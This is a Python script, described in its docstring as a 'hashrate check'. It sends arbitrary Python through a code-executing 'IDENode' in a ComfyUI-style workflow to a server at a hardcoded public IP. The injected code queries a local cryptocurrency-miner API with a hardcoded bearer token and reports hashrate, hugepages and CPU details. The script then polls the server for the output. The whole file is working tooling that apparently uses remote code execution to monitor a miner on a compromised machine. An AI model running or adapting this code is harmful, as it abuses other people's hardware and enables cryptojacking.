"""Quick hashrate check via IDENode."""
import json, urllib.request, time, sys

ip = sys.argv[1] if len(sys.argv) > 1 else "59.34.28.50"
port = sys.argv[2] if len(sys.argv) > 2 else "8188"
base = f"http://{ip}:{port}"

CODE = (
    "import json\n"
    "try:\n"
    "    import urllib.request\n"
    "    req = urllib.request.Request(\n"
    "        'http://127.0.0.1:44880/2/summary',\n"
    "        headers={'Authorization': 'Bearer ce_xm_2026', 'Accept': 'application/json'}\n"
    "    )\n"
    "    with urllib.request.urlopen(req, timeout=5) as resp:\n"
    "        d = json.loads(resp.read())\n"
    "    hr = d.get('hashrate', {}).get('total', [])\n"
    "    hp = d.get('hugepages', [])\n"
    "    cpu = d.get('cpu', {})\n"
    "    result = (\n"
    "        f\"uptime={d.get('uptime')}s \"\n"
    "        f\"hr_10s={hr[0] if len(hr)>0 else 'N/A'} \"\n"
    "        f\"hr_60s={hr[1] if len(hr)>1 else 'N/A'} \"\n"
    "        f\"hr_15m={hr[2] if len(hr)>2 else 'N/A'} \"\n"
    "        f\"max={d.get('hashrate',{}).get('highest')} \"\n"
    "        f\"hp={hp} \"\n"
    "        f\"threads={cpu.get('threads')} \"\n"
    "        f\"cpu={cpu.get('brand')}\"\n"
    "    )\n"
    "except Exception as e:\n"
    "    result = f'ERROR: {e}'\n"
)

workflow_stub = {"workflow": {"nodes": [{"id": 1, "type": "IDENode"}, {"id": 2, "type": "PreviewTextNode"}]}}
prompt = {
    "prompt": {
        "1": {"class_type": "IDENode", "inputs": {"pycode": CODE, "language": "python"}},
        "2": {"class_type": "PreviewTextNode", "inputs": {"text": ["1", 0]}}
    },
    "extra_data": {"extra_pnginfo": workflow_stub}
}

body = json.dumps(prompt).encode()
req = urllib.request.Request(f"{base}/prompt", data=body,
                            headers={"Content-Type": "application/json"}, method="POST")
with urllib.request.urlopen(req, timeout=15) as r:
    data = json.loads(r.read().decode())
    pid = data.get("prompt_id")
    print(f"prompt_id: {pid}")

for attempt in range(12):
    time.sleep(5)
    try:
        req2 = urllib.request.Request(f"{base}/history/{pid}")
        with urllib.request.urlopen(req2, timeout=15) as r:
            entry = json.loads(r.read().decode()).get(pid, {})
            status = entry.get("status", {}).get("status_str", "pending")
            if status != "pending":
                print(f"Status: {status}")
                outputs = entry.get("outputs", {})
                for nid, nout in outputs.items():
                    for key, val in nout.items():
                        if isinstance(val, list):
                            for v in val:
                                print(v)
                break
    except Exception as e:
        print(f"poll: {e}")
else:
    print("timeout")
